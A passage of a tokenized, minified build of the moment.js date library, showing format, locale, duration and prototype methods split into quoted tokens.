"(", ")/", "100", ")", "},", "SS", ":", "function", "(", "){", "return", "p", "(", "A", "(", "this", ".", "milliseconds", "(", ")/", "10", ")", ",", "2", ")", "},", "SSS", ":", "function", "(", "){", "return", "p", "(", "this", ".", "milliseconds", "(", "),", "3", ")", "},", "SSSS", ":", "function", "(", "){", "return", "p", "(", "this", ".", "milliseconds", "(", "),", "3", ")", "},", "Z", ":", "function", "(", "){", "var", "a", "=", "-", "this", ".", "zone", "(", "),", "b", "=", "\"+", "\";", "return", "0", ">", "a", "&", "&(", "a", "=", "-", "a", ",", "b", "=", "\"-", "\")", ",", "b", "+", "p", "(", "A", "(", "a", "/", "60", ")", ",", "2", ")", "+\"", ":\"", "+", "p", "(", "A", "(", "a", ")", "%", "60", ",", "2", ")", "},", "ZZ", ":", "function", "(", "){", "var", "a", "=", "-", "this", ".", "zone", "(", "),", "b", "=", "\"+", "\";", "return", "0", ">", "a", "&", "&(", "a", "=", "-", "a", ",", "b", "=", "\"-", "\")", ",", "b", "+", "p", "(", "A", "(", "a", "/", "60", ")", ",", "2", ")", "+", "p", "(", "A", "(", "a", ")", "%", "60", ",", "2", ")", "},", "z", ":", "function", "(", "){", "return", "this", ".", "zoneAbbr", "(", ")}", ",", "zz", ":", "function", "(", "){", "return", "this", ".", "zoneName", "(", ")}", ",", "x", ":", "function", "(", "){", "return", "this", ".", "valueOf", "(", ")}", ",", "X", ":", "function", "(", "){", "return", "this", ".", "unix", "(", ")}", ",", "Q", ":", "function", "(", "){", "return", "this", ".", "quarter", "(", ")}", "},", "qc", "=", "{}", ",", "rc", "=", "[\"", "months", "\"", ",\"", "monthsShort", "\"", ",\"", "weekdays", "\"", ",\"", "weekdaysShort", "\"", ",\"", "weekdaysMin", "\"", "];", "nc", ".", "length", ";", ")", "vb", "=", "nc", ".", "pop", "(", "),", "pc", "[", "vb", "+", "\"", "o", "\"", "]=", "i", "(", "pc", "[", "vb", "]", ",", "vb", ")", ";", "for", "(", ";", "oc", ".", "length", ";", ")", "vb", "=", "oc", ".", "pop", "(", "),", "pc", "[", "vb", "+", "vb", "]", "=", "h", "(", "pc", "[", "vb", "]", ",", "2", ")", ";", "pc", ".", "DDDD", "=", "h", "(", "pc", ".", "DDD", ",", "3", ")", ",", "m", "(", "j", ".", "prototype", ",", "{", "set", ":", "function", "(", "a", ")", "{", "var", "b", ",", "c", ";", "for", "(", "c", "in", "a", ")", "b", "=", "a", "[", "c", "]", ",\"", "function", "\"", "==", "typeof", "b", "?", "this", "[", "c", "]", "=", "b", ":", "this", "[", "\"", "_", "\"", "+", "c", "]", "=", "b", ";", "this", ".", "_ordinalParseLenient", "=", "new", "RegExp", "(", "this", ".", "_ordinalParse", ".", "source", "+", "\"|", "\"+", "/\\", "d", "{", "1", ",", "2", "}", "/.", "source", ")", "},", "_months", ":", "\"", "January_February_March_April_May_June_July_August_September_October_November_December", "\"", ".", "split", "(", "\"", "_", "\"", "),", "months", ":", "function", "(", "a", ")", "{", "return", "this", ".", "_months", "[", "a", ".", "month", "(", ")]", "},", "_monthsShort", ":", "\"", "Jan_Feb_Mar_Apr_May_Jun_Jul_Aug_Sep_Oct_Nov_Dec", "\"", ".", "split", "(", "\"", "_", "\"", "),", "monthsShort", ":", "function", "(", "a", ")", "{", "return", "this", ".", "_monthsShort", "[", "a", ".", "month", "(", ")]", "},", "monthsParse", ":", "function", "(", "a", ",", "b", ",", "c", ")", "{", "var", "d", ",", "e", ",", "f", ";", "for", "(", "this", ".", "_monthsParse", "|", "|(", "this", ".", "_monthsParse", "=", "[]", ",", "this", ".", "_longMonthsParse", "=", "[]", ",", "this", ".", "_shortMonthsParse", "=", "[]", "),", "d", "=", "0", ";", "12", ">", "d", ";", "d", "+", "+)", "{", "if", "(", "e", "=", "tb", ".", "utc", "(", "[", "2e3", ",", "d", "]", "),", "c", "&", "&!", "this", ".", "_longMonthsParse", "[", "d", "]", "&&", "(", "this", ".", "_longMonthsParse", "[", "d", "]", "=", "new", "RegExp", "(", "\"^", "\"+", "this", ".", "months", "(", "e", ",", "\"\"", ").", "replace", "(", "\".", "\",", "\"\"", ")+", "\"$", "\",", "\"", "i", "\"", "),", "this", ".", "_shortMonthsParse", "[", "d", "]", "=", "new", "RegExp", "(", "\"^", "\"+", "this", ".", "monthsShort", "(", "e", ",", "\"\"", ").", "replace", "(", "\".", "\",", "\"\"", ")+", "\"$", "\",", "\"", "i", "\"", "))", ",", "c", "|", "|", "this", ".", "_monthsParse", "[", "d", "]", "||", "(", "f", "=", "\"^", "\"+", "this", ".", "months", "(", "e", ",", "\"\"", ")+", "\"|", "^\"", "+", "this", ".", "monthsShort", "(", "e", ",", "\"\"", "),", "this", ".", "_monthsParse", "[", "d", "]", "=", "new", "RegExp", "(", "f", ".", "replace", "(", "\".", "\",", "\"\"", "),", "\"", "i", "\"", "))", ",", "c", "&", "&\"", "MMMM", "\"", "==", "=", "b", "&", "&", "this", ".", "_longMonthsParse", "[", "d", "]", ".", "test", "(", "a", ")", ")", "return", "d", ";", "if", "(", "c", "&", "&\"", "MMM", "\"", "==", "=", "b", "&", "&", "this", ".", "_shortMonthsParse", "[", "d", "]", ".", "test", "(", "a", ")", ")", "return", "d", ";", "if", "(", "!", "c", "&", "&", "this", ".", "_monthsParse", "[", "d", "]", ".", "test", "(", "a", ")", ")", "return", "d", "}", "},", "_weekdays", ":", "\"", "Sunday_Monday_Tuesday_Wednesday_Thursday_Friday_Saturday", "\"", ".", "split", "(", "\"", "_", "\"", "),", "weekdays", ":", "function", "(", "a", ")", "{", "return", "this", ".", "_weekdays", "[", "a", ".", "day", "(", ")]", "},", "_weekdaysShort", ":", "\"", "Sun_Mon_Tue_Wed_Thu_Fri_Sat", "\"", ".", "split", "(", "\"", "_", "\"", "),", "weekdaysShort", ":", "function", "(", "a", ")", "{", "return", "this", ".", "_weekdaysShort", "[", "a", ".", "day", "(", ")]", "},", "_weekdaysMin", ":", "\"", "Su_Mo_Tu_We_Th_Fr_Sa", "\"", ".", "split", "(", "\"", "_", "\"", "),", "weekdaysMin", ":", "function", "(", "a", ")", "{", "return", "this", ".", "_weekdaysMin", "[", "a", ".", "day", "(", ")]", "},", "weekdaysParse", ":", "function", "(", "a", ")", "{", "var", "b", ",", "c", ",", "d", ";", "for", "(", "this", ".", "_weekdaysParse", "|", "|(", "this", ".", "_weekdaysParse", "=", "[]", "),", "b", "=", "0", ";", "7", ">", "b", ";", "b", "+", "+)", "if", "(", "this", ".", "_weekdaysParse", "[", "b", "]", "||", "(", "c", "=", "tb", "(", "[", "2e3", ",", "1", "]", ").", "day", "(", "b", ")", ",", "d", "=", "\"^", "\"+", "this", ".", "weekdays", "(", "c", ",", "\"\"", ")+", "\"|", "^\"", "+", "this", ".", "weekdaysShort", "(", "c", ",", "\"\"", ")+", "\"|", "^\"", "+", "this", ".", "weekdaysMin", "(", "c", ",", "\"\"", "),", "this", ".", "_weekdaysParse", "[", "b", "]", "=", "new", "RegExp", "(", "d", ".", "replace", "(", "\".", "\",", "\"\"", "),", "\"", "i", "\"", "))", ",", "this", ".", "_weekdaysParse", "[", "b", "]", ".", "test", "(", "a", ")", ")", "return", "b", "}", ",", "_longDateFormat", ":", "{", "LTS", ":", "\"", "h", ":", "mm", ":", "ss", "A", "\"", ",", "LT", ":", "\"", "h", ":", "mm", "A", "\"", ",", "L", ":", "\"", "MM", "/", "DD", "/", "YYYY", "\"", ",", "LL", ":", "\"", "MMMM", "D", ",", "YYYY", "\"", ",", "LLL", ":", "\"", "MMMM", "D", ",", "YYYY", "LT", "\"", ",", "LLLL", ":", "\"", "dddd", ",", "MMMM", "D", ",", "YYYY", "LT", "\"", "},", "longDateFormat", ":", "function", "(", "a", ")", "{", "var", "b", "=", "this", ".", "_longDateFormat", "[", "a", "]", ";", "return", "!", "b", "&", "&", "this", ".", "_longDateFormat", "[", "a", ".", "toUpperCase", "(", ")]", "&&", "(", "b", "=", "this", ".", "_longDateFormat", "[", "a", ".", "toUpperCase", "(", ")]", ".", "replace", "(", "/", "MMMM", "|", "MM", "|", "DD", "|", "dddd", "/", "g", ",", "function", "(", "a", ")", "{", "return", "a", ".", "slice", "(", "1", ")", "})", ",", "this", ".", "_longDateFormat", "[", "a", "]", "=", "b", ")", ",", "b", "}", ",", "isPM", ":", "function", "(", "a", ")", "{", "return", "\"", "p", "\"", "==", "=(", "a", "+", "\"\"", ").", "toLowerCase", "(", ").", "charAt", "(", "0", ")", "},", "_meridiemParse", ":", "/[", "ap", "]", "\\.", "?", "m", "?", "\\.", "?/", "i", ",", "meridiem", ":", "function", "(", "a", ",", "b", ",", "c", ")", "{", "return", "a", ">", "11", "?", "c", "?", "\"", "pm", "\"", ":\"", "PM", "\"", ":", "c", "?", "\"", "am", "\"", ":\"", "AM", "\"", "},", "_calendar", ":", "{", "sameDay", ":", "\"[", "Today", "at", "]", "LT", "\"", ",", "nextDay", ":", "\"[", "Tomorrow", "at", "]", "LT", "\"", ",", "nextWeek", ":", "\"", "dddd", "[", "at", "]", "LT", "\"", ",", "lastDay", ":", "\"[", "Yesterday", "at", "]", "LT", "\"", ",", "lastWeek", ":", "\"[", "Last", "]", "dddd", "[", "at", "]", "LT", "\"", ",", "sameElse", ":", "\"", "L", "\"", "},", "calendar", ":", "function", "(", "a", ",", "b", ",", "c", ")", "{", "var", "d", "=", "this", ".", "_calendar", "[", "a", "]", ";", "return", "\"", "function", "\"", "==", "typeof", "d", "?", "d", ".", "apply", "(", "b", ",", "[", "c", "]", "):", "d", "}", ",", "_relativeTime", ":", "{", "future", ":", "\"", "in", "%", "s", "\"", ",", "past", ":", "\"%", "s", "ago", "\"", ",", "s", ":", "\"", "a", "few", "seconds", "\"", ",", "m", ":", "\"", "a", "minute", "\"", ",", "mm", ":", "\"%", "d", "minutes", "\"", ",", "h", ":", "\"", "an", "hour", "\"", ",", "hh", ":", "\"%", "d", "hours", "\"", ",", "d", ":", "\"", "a", "day", "\"", ",", "dd", ":", "\"%", "d", "days", "\"", ",", "M", ":", "\"", "a", "month", "\"", ",", "MM", ":", "\"%", "d", "months", "\"", ",", "y", ":", "\"", "a", "year", "\"", ",", "yy", ":", "\"%", "d", "years", "\"", "},", "relativeTime", ":", "function", "(", "a", ",", "b", ",", "c", ",", "d", ")", "{", "var", "e", "=", "this", ".", "_relativeTime", "[", "c", "]", ";", "return", "\"", "function", "\"", "==", "typeof", "e", "?", "e", "(", "a", ",", "b", ",", "c", ",", "d", ")", ":", "e", ".", "replace", "(", "/%", "d", "/", "i", ",", "a", ")", "},", "pastFuture", ":", "function", "(", "a", ",", "b", ")", "{", "var", "c", "=", "this", ".", "_relativeTime", "[", "a", ">", "0", "?", "\"", "future", "\"", ":\"", "past", "\"", "];", "return", "\"", "function", "\"", "==", "typeof", "c", "?", "c", "(", "b", ")", ":", "c", ".", "replace", "(", "/%", "s", "/", "i", ",", "b", ")", "},", "ordinal", ":", "function", "(", "a", ")", "{", "return", "this", ".", "_ordinal", ".", "replace", "(", "\"%", "d", "\"", ",", "a", ")", "},", "_ordinal", ":", "\"%", "d", "\"", ",", "_ordinalParse", ":", "/\\", "d", "{", "1", ",", "2", "}", "/,", "preparse", ":", "function", "(", "a", ")", "{", "return", "a", "}", ",", "postformat", ":", "function", "(", "a", ")", "{", "return", "a", "}", ",", "week", ":", "function", "(", "a", ")", "{", "return", "hb", "(", "a", ",", "this", ".", "_week", ".", "dow", ",", "this", ".", "_week", ".", "doy", ")", ".", "week", "}", ",", "_week", ":", "{", "dow", ":", "0", ",", "doy", ":", "6", "}", ",", "_invalidDate", ":", "\"", "Invalid", "date", "\"", ",", "invalidDate", ":", "function", "(", "){", "return", "this", ".", "_invalidDate", "}", "})", ",", "tb", "=", "function", "(", "b", ",", "c", ",", "e", ",", "f", ")", "{", "var", "g", ";", "return", "\"", "boolean", "\"", "==", "typeof", "e", "&", "&(", "f", "=", "e", ",", "e", "=", "a", ")", ",", "g", "=", "{}", ",", "g", ".", "_isAMomentObject", "=", "!", "0", ",", "g", ".", "_i", "=", "b", ",", "g", ".", "_f", "=", "c", ",", "g", ".", "_l", "=", "e", ",", "g", ".", "_strict", "=", "f", ",", "g", ".", "_isUTC", "=", "!", "1", ",", "g", ".", "_pf", "=", "d", "(", "),", "jb", "(", "g", ")", "},", "tb", ".", "suppressDeprecationWarnings", "=", "!", "1", ",", "tb", ".", "createFromInputFallback", "=", "f", "(", "\"", "moment", "construction", "falls", "back", "to", "js", "Date", ".", "This", "is", "discouraged", "and", "will", "be", "removed", "in", "upcoming", "major", "release", ".", "Please", "refer", "to", "https", ":", "//", "github", ".", "com", "/", "moment", "/", "moment", "/", "issues", "/", "1407", "for", "more", "info", ".", "\",", "function", "(", "a", ")", "{", "a", ".", "_d", "=", "new", "Date", "(", "a", ".", "_i", "+", "(", "a", ".", "_useUTC", "?", "\"", "UTC", "\"", ":\"", "\")", ")}", "),", "tb", ".", "min", "=", "function", "(", "){", "var", "a", "=", "[]", ".", "slice", ".", "call", "(", "arguments", ",", "0", ")", ";", "return", "kb", "(", "\"", "isBefore", "\"", ",", "a", ")", "},", "tb", ".", "max", "=", "function", "(", "){", "var", "a", "=", "[]", ".", "slice", ".", "call", "(", "arguments", ",", "0", ")", ";", "return", "kb", "(", "\"", "isAfter", "\"", ",", "a", ")", "},", "tb", ".", "utc", "=", "function", "(", "b", ",", "c", ",", "e", ",", "f", ")", "{", "var", "g", ";", "return", "\"", "boolean", "\"", "==", "typeof", "e", "&", "&(", "f", "=", "e", ",", "e", "=", "a", ")", ",", "g", "=", "{}", ",", "g", ".", "_isAMomentObject", "=", "!", "0", ",", "g", ".", "_useUTC", "=", "!", "0", ",", "g", ".", "_isUTC", "=", "!", "0", ",", "g", ".", "_l", "=", "e", ",", "g", ".", "_i", "=", "b", ",", "g", ".", "_f", "=", "c", ",", "g", ".", "_strict", "=", "f", ",", "g", ".", "_pf", "=", "d", "(", "),", "jb", "(", "g", ")", ".", "utc", "(", ")}", ",", "tb", ".", "unix", "=", "function", "(", "a", ")", "{", "return", "tb", "(", "1e3", "*", "a", ")", "},", "tb", ".", "duration", "=", "function", "(", "a", ",", "b", ")", "{", "var", "d", ",", "e", ",", "f", ",", "g", ",", "h", "=", "a", ",", "i", "=", "null", ";", "return", "tb", ".", "isDuration", "(", "a", ")", "?", "h", "=", "{", "ms", ":", "a", ".", "_milliseconds", ",", "d", ":", "a", ".", "_days", ",", "M", ":", "a", ".", "_months", "}", ":\"", "number", "\"", "==", "typeof", "a", "?", "(", "h", "=", "{}", ",", "b", "?", "h", "[", "b", "]", "=", "a", ":", "h", ".", "milliseconds", "=", "a", ")", ":(", "i", "=", "Lb", ".", "exec", "(", "a", ")", ")?", "(", "d", "=", "\"-", "\"=", "==", "i", "[", "1", "]", "?-", "1", ":", "1", ",", "h", "=", "{", "y", ":", "0", ",", "d", ":", "A", "(", "i", "[", "Cb", "]", ")*", "d", ",", "h", ":", "A", "(", "i", "[", "Db", "]", ")*", "d", ",", "m", ":", "A", "(", "i", "[", "Eb", "]", ")*", "d", ",", "s", ":", "A", "(", "i", "[", "Fb", "]", ")*", "d", ",", "ms", ":", "A", "(", "i", "[", "Gb", "]", ")*", "d", "}", "):", "(", "i", "=", "Mb", ".", "exec", "(", "a", ")", ")?", "(", "d", "=", "\"-", "\"=", "==", "i", "[", "1", "]", "?-", "1", ":", "1", ",", "f", "=", "function", "(", "a", ")", "{", "var", "b", "=", "a", "&", "&", "parseFloat", "(", "a", ".", "replace", "(", "\",", "\",", "\".", "\")", ");", "return", "(", "isNaN", "(", "b", ")", "?", "0", ":", "b", ")", "*", "d", "}", ",", "h", "=", "{", "y", ":", "f", "(", "i", "[", "2", "]", "),", "M", ":", "f", "(", "i", "[", "3", "]", "),", "d", ":", "f", "(", "i", "[", "4", "]", "),", "h", ":", "f", "(", "i", "[", "5", "]", "),", "m", ":", "f", "(", "i", "[", "6", "]", "),", "s", ":", "f", "(", "i", "[", "7", "]", "),", "w", ":", "f", "(", "i", "[", "8", "]", ")}", "):", "\"", "object", "\"", "==", "typeof", "h", "&", "&(", "\"", "from", "\"", "in", "h", "|", "|\"", "to", "\"", "in", "h", ")", "&&", "(", "g", "=", "r", "(", "tb", "(", "h", ".", "from", ")", ",", "tb", "(", "h", ".", "to", ")", "),", "h", "=", "{}", ",", "h", ".", "ms", "=", "g", ".", "milliseconds", ",", "h", ".", "M", "=", "g", ".", "months", ")", ",", "e", "=", "new", "l", "(", "h", ")", ",", "tb", ".", "isDuration", "(", "a", ")", "&&", "c", "(", "a", ",", "\"", "_locale", "\"", ")&", "&(", "e", ".", "_locale", "=", "a", ".", "_locale", ")", ",", "e", "}", ",", "tb", ".", "version", "=", "wb", ",", "tb", ".", "defaultFormat", "=", "ec", ",", "tb", ".", "ISO_8601", "=", "function", "(", "){", "},", "tb", ".", "momentProperties", "=", "Ib", ",", "tb", ".", "updateOffset", "=", "function", "(", "){", "},", "tb", ".", "relativeTimeThreshold", "=", "function", "(", "b", ",", "c", ")", "{", "return", "mc", "[", "b", "]", "==", "=", "a", "?", "!", "1", ":", "c", "=", "==", "a", "?", "mc", "[", "b", "]", ":(", "mc", "[", "b", "]", "=", "c", ",", "!", "0", ")", "},", "tb", ".", "lang", "=", "f", "(", "\"", "moment", ".", "lang", "is", "deprecated", ".", "Use", "moment", ".", "locale", "instead", ".", "\",", "function", "(", "a", ",", "b", ")", "{", "return", "tb", ".", "locale", "(", "a", ",", "b", ")", "})", ",", "tb", ".", "locale", "=", "function", "(", "a", ",", "b", ")", "{", "var", "c", ";", "return", "a", "&", "&(", "c", "=", "\"", "undefined", "\"", "!=", "typeof", "b", "?", "tb", ".", "defineLocale", "(", "a", ",", "b", ")", ":", "tb", ".", "localeData", "(", "a", ")", ",", "c", "&", "&(", "tb", ".", "duration", ".", "_locale", "=", "tb", ".", "_locale", "=", "c", ")", "),", "tb", ".", "_locale", ".", "_abbr", "}", ",", "tb", ".", "defineLocale", "=", "function", "(", "a", ",", "b", ")", "{", "return", "null", "!", "==", "b", "?", "(", "b", ".", "abbr", "=", "a", ",", "Hb", "[", "a", "]", "||", "(", "Hb", "[", "a", "]", "=", "new", "j", ")", ",", "Hb", "[", "a", "]", ".", "set", "(", "b", ")", ",", "tb", ".", "locale", "(", "a", ")", ",", "Hb", "[", "a", "]", "):", "(", "delete", "Hb", "[", "a", "]", ",", "null", ")", "},", "tb", ".", "langData", "=", "f", "(", "\"", "moment", ".", "langData", "is", "deprecated", ".", "Use", "moment", ".", "localeData", "instead", ".", "\",", "function", "(", "a", ")", "{", "return", "tb", ".", "localeData", "(", "a", ")", "})", ",", "tb", ".", "localeData", "=", "function", "(", "a", ")", "{", "var", "b", ";", "if", "(", "a", "&", "&", "a", ".", "_locale", "&", "&", "a", ".", "_locale", ".", "_abbr", "&", "&(", "a", "=", "a", ".", "_locale", ".", "_abbr", ")", ",!", "a", ")", "return", "tb", ".", "_locale", ";", "if", "(", "!", "u", "(", "a", ")", "){", "if", "(", "b", "=", "J", "(", "a", ")", ")", "return", "b", ";", "a", "=", "[", "a", "]", "}", "return", "I", "(", "a", ")", "},", "tb", ".", "isMoment", "=", "function", "(", "a", ")", "{", "return", "a", "instanceof", "k", "|", "|", "null", "!", "=", "a", "&", "&", "c", "(", "a", ",", "\"", "_isAMomentObject", "\"", ")}", ",", "tb", ".", "isDuration", "=", "function", "(", "a", ")", "{", "return", "a", "instanceof", "l", "}", ";", "for", "(", "vb", "=", "rc", ".", "length", "-", "1", ";", "vb", ">", "=", "0", ";", "--", "vb", ")", "z", "(", "rc", "[", "vb", "]", ");", "tb", ".", "normalizeUnits", "=", "function", "(", "a", ")", "{", "return", "x", "(", "a", ")", "},", "tb", ".", "invalid", "=", "function", "(", "a", ")", "{", "var", "b", "=", "tb", ".", "utc", "(", "0", "/", "0", ")", ";", "return", "null", "!", "=", "a", "?", "m", "(", "b", ".", "_pf", ",", "a", ")", ":", "b", ".", "_pf", ".", "userInvalidated", "=", "!", "0", ",", "b", "}", ",", "tb", ".", "parseZone", "=", "function", "(", "){", "return", "tb", ".", "apply", "(", "null", ",", "arguments", ")", ".", "parseZone", "(", ")}", ",", "tb", ".", "parseTwoDigitYear", "=", "function", "(", "a", ")", "{", "return", "A", "(", "a", ")", "+(", "A", "(", "a", ")", ">", "68", "?", "1900", ":", "2e3", ")", "},", "m", "(", "tb", ".", "fn", "=", "k", ".", "prototype", ",", "{", "clone", ":", "function", "(", "){", "return", "tb", "(", "this", ")", "},", "valueOf", ":", "function", "(", "){", "return", "+", "this", ".", "_d", "+", "6e4", "*", "(", "this", ".", "_offset", "|", "|", "0", ")", "},", "unix", ":", "function", "(", "){", "return", "Math", ".", "floor", "(", "+", "this", "/", "1e3", ")", "},", "toString", ":", "function", "(", "){", "return", "this", ".", "clone", "(", ").", "locale", "(", "\"", "en", "\"", ").", "format", "(", "\"", "ddd", "MMM", "DD", "YYYY", "HH", ":", "mm", ":", "ss", "[", "GMT", "]", "ZZ", "\"", ")}", ",", "toDate", ":", "function", "(", "){", "return", "this", ".", "_offset", "?", "new", "Date", "(", "+", "this", ")", ":", "this", ".", "_d", "}", ",", "toISOString", ":", "function", "(", "){", "var", "a", "=", "tb", "(", "this", ")", ".", "utc", "(", ");", "return", "0", "<", "a", ".", "year", "(", ")&", "&", "a", ".", "year", "(", ")<", "=", "9999", "?", "\"", "function", "\"", "==", "typeof", "Date", ".", "prototype", ".", "toISOString", "?", "this", ".", "toDate", "(", ").", "toISOString", "(", "):", "N", "(", "a", ",", "\"", "YYYY", "-", "MM", "-", "DD", "[", "T", "]", "HH", ":", "mm", ":", "ss", ".", "SSS", "[", "Z", "]", "\")", ":", "N", "(", "a", ",", "\"", "YYYYYY", "-", "MM", "-", "DD", "[", "T", "]", "HH", ":", "mm", ":", "ss", ".", "SSS", "[", "Z", "]", "\")", "},", "toArray", ":", "function", "(", "){", "var", "a", "=", "this", ";", "return", "[", "a", ".", "year", "(", "),", "a", ".", "month", "(", "),", "a", ".", "date", "(", "),", "a", ".", "hours", "(", "),", "a", ".", "minutes", "(", "),", "a", ".", "seconds", "(", "),", "a", ".", "milliseconds", "(", ")]", "},", "isValid", ":", "function", "(", "){", "return", "G", "(", "this", ")", "},", "isDSTShifted", ":", "function", "(", "){", "return", "this", ".", "_a", "?", "this", ".", "isValid", "(", ")&", "&", "w", "(", "this", ".", "_a", ",", "(", "this", ".", "_isUTC", "?", "tb", ".", "utc", "(", "this", ".", "_a", ")", ":", "tb", "(", "this", ".", "_a", ")", ").", "toArray", "(", "))", ">", "0", ":", "!", "1", "}", ",", "parsingFlags", ":", "function", "(", "){", "return", "m", "(", "{}", ",", "this", ".", "_pf", ")", "},", "invalidAt", ":", "function", "(", "){", "return", "this", ".", "_pf", ".", "overflow", "}", ",", "utc", ":", "function", "(", "a", ")", "{", "return", "this", ".", "zone", "(", "0", ",", "a", ")", "},", "local", ":", "function", "(", "a", ")", "{", "return", "this", ".", "_isUTC", "&", "&(", "this", ".", "zone", "(", "0", ",", "a", ")", ",", "this", ".", "_isUTC", "=", "!", "1", ",", "a", "&", "&", "this", ".", "add", "(", "this", ".", "_dateTzOffset", "(", "),", "\"", "m", "\"", "))", ",", "this", "}", ",", "format", ":", "function", "(", "a", ")", "{", "var", "b", "=", "N", "(", "this", ",", "a", "|", "|", "tb", ".", "defaultFormat", ")", ";", "return", "this", ".", "localeData", "(", ").", "postformat", "(", "b", ")", "},", "add", ":", "s", "(", "1", ",", "\"", "add", "\"", "),", "subtract", ":", "s", "(", "-", "1", ",", "\"", "subtract", "\"", "),", "diff", ":", "function", "(", "a", ",", "b", ",", "c", ")", "{", "var", "d", ",", "e", ",", "f", ",", "g", "=", "K", "(", "a", ",", "this", ")", ",", "h", "=", "6e4", "*", "(", "this", ".", "zone", "(", ")-", "g", ".", "zone", "(", "))", ";", "return", "b", "=", "x", "(", "b", ")", ",\"", "year", "\"", "==", "=", "b", "|", "|\"", "month", "\"", "==", "=", "b", "?", "(", "d", "=", "432e5", "*", "(", "this", ".", "daysInMonth", "(", ")+", "g", ".", "daysInMonth", "(", "))", ",", "e", "=", "12", "*", "(", "this", ".", "year", "(", ")-", "g", ".", "year", "(", "))", "+(", "this", ".", "month", "(", ")-", "g", ".", "month", "(", "))", ",", "f", "=", "this", "-", "tb", "(", "this", ")", ".", "startOf", "(", "\"", "month", "\"", ")-", "(", "g", "-", "tb", "(", "g", ")", ".", "startOf", "(", "\"", "month", "\"", "))", ",", "f", "-", "=", "6e4", "*", "(", "this", ".", "zone", "(", ")-", "tb", "(", "this", ")", ".", "startOf", "(", "\"", "month", "\"", ").", "zone", "(", ")-", "(", "g", ".", "zone", "(", ")-", "tb", "(", "g", ")", ".", "startOf", "(", "\"", "month", "\"", ").", "zone", "(", "))", "),", "e", "+", "=", "f", "/", "d", ",", "\"", "year", "\"", "==", "=", "b", "&", "&(", "e", "/", "=", "12", ")", "):", "(", "d", "=", "this", "-", "g", ",", "e", "=", "\"", "second", "\"", "==", "=", "b", "?", "d", "/", "1e3", ":", "\"", "minute", "\"", "==", "=", "b", "?", "d", "/", "6e4", ":", "\"", "hour", "\"", "==", "=", "b", "?", "d", "/", "36e5", ":", "\"", "day", "\"", "==", "=", "b", "?", "(", "d", "-", "h", ")", "/", "864e5", ":", "\"", "week", "\"", "==", "=", "b", "?", "(", "d", "-", "h", ")", "/", "6048e5", ":", "d", ")", ",", "c", "?", "e", ":", "o", "(", "e", ")", "},", "from", ":", "function", "(", "a", ",", "b", ")", "{", "return", "tb", ".", "duration", "(", "{", "to", ":", "this", ",", "from", ":", "a", "}", ").", "locale", "(", "this", ".", "locale", "(", "))", ".", "humanize", "(", "!", "b", ")", "},", "fromNow", ":", "function", "(", "a", ")", "{", "return", "this", ".", "from", "(", "tb", "(", "),", "a", ")", "},", "calendar", ":", "function", "(", "a", ")", "{", "var", "b", "=", "a", "|", "|", "tb", "(", "),", "c", "=", "K", "(", "b", ",", "this", ")", ".", "startOf", "(", "\"", "day", "\"", "),", "d", "=", "this", ".", "diff", "(", "c", ",", "\"", "days", "\"", ",!", "0", ")", ",", "e", "=", "-", "6", ">", "d", "?", "\"", "sameElse", "\"", ":-", "1", ">", "d", "?", "\"", "lastWeek", "\"", ":", "0", ">", "d", "?", "\"", "lastDay", "\"", ":", "1", ">", "d", "?", "\"", "sameDay", "\"", ":", "2", ">", "d", "?", "\"", "nextDay", "\"", ":", "7", ">", "d", "?", "\"", "nextWeek", "\"", ":\"", "sameElse", "\"", ";", "return", "this", ".", "format", "(", "this", ".", "localeData", "(", ").", "calendar", "(", "e", ",", "this", ",", "tb", "(", "b", ")", "))", "},", "isLeapYear", ":", "function", "(", "){", "return", "E", "(", "this", ".", "year", "(", "))", "},", "isDST", ":", "function", "(", "){", "return", "this", ".", "zone", "(", ")<", "this", ".", "clone", "(", ").", "month", "(", "0", ")", ".", "zone", "(", ")|", "|", "this", ".", "zone", "(", ")<", "this", ".", "clone", "(", ").", "month", "(", "5", ")", ".", "zone", "(", ")}", ",", "day", ":", "function", "(", "a", ")", "{", "var", "b", "=", "this", ".", "_isUTC", "?", "this", ".", "_d", ".", "getUTCDay", "(", "):", "this", ".", "_d", ".", "getDay", "(", ");", "return", "null", "!", "=", "a", "?", "(", "a", "=", "eb", "(", "a", ",", "this", ".", "localeData", "(", "))", ",", "this", ".", "add", "(", "a", "-", "b", ",", "\"", "d", "\"", "))", ":", "b", "}", ",", "month", ":", "ob", "(", "\"", "Month", "\"", ",!", "0", ")", ",", "startOf", ":", "function", "(", "a", ")", "{", "switch", "(", "a", "=", "x", "(", "a", ")", "){", "case", "\"", "year", "\"", ":", "this", ".", "month", "(", "0", ")", ";", "case", "\"", "quarter", "\"", ":", "case", "\"", "month", "\"", ":", "this", ".", "date", "(", "1", ")", ";", "case", "\"", "week", "\"", ":", "case", "\"", "isoWeek", "\"", ":", "case", "\"", "day", "\"", ":", "this", ".", "hours", "(", "0", ")", ";", "case", "\"", "hour", "\"", ":", "this", ".", "minutes", "(", "0", ")", ";", "case", "\"", "minute", "\"", ":", "this", ".", "seconds", "(", "0", ")", ";", "case", "\"", "second", "\"", ":", "this", ".", "milliseconds", "(", "0", ")", "}", "return", "\"", "week", "\"", "==", "=", "a", "?", "this", ".", "weekday", "(", "0", ")", ":\"", "isoWeek", "\"", "==", "=", "a", "&", "&", "this", ".", "isoWeekday", "(", "1", ")", ",\"", "quarter", "\"", "==", "=", "a", "&", "&", "this", ".", "month", "(", "3", "*", "Math", ".", "floor", "(", "this", ".", "month", "(", ")/", "3", ")", "),", "this", "}", ",", "endOf", ":", "function", "(", "b", ")", "{", "return", "b", "=", "x", "(", "b", ")", ",", "b", "=", "==", "a", "|", "|\"", "millisecond", "\"", "==", "=", "b", "?", "this", ":", "this", ".", "startOf", "(", "b", ")", ".", "add", "(", "1", ",", "\"", "isoWeek", "\"", "==", "=", "b", "?", "\"", "week", "\"", ":", "b", ")", ".", "subtract", "(", "1", ",", "\"", "ms", "\"", ")}", ",", "isAfter", ":", "function", "(", "a", ",", "b", ")", "{", "var", "c", ";", "return", "b", "=", "x", "(", "\"", "undefined", "\"", "!=", "typeof", "b", "?", "b", ":", "\"", "millisecond", "\"", "),", "\"", "millisecond", "\"", "==", "=", "b", "?", "(", "a", "=", "tb", ".", "isMoment", "(", "a", ")", "?", "a", ":", "tb", "(", "a", ")", ",+", "this", ">", "+", "a", ")", ":(", "c", "=", "tb", ".", "isMoment", "(", "a", ")", "?+", "a", ":", "+", "tb", "(", "a", ")", ",", "c", "<", "+", "this", ".", "clone", "(", ").", "startOf", "(", "b", ")", ")}", ",", "isBefore", ":", "function", "(", "a", ",", "b", ")", "{", "var", "c", ";", "return", 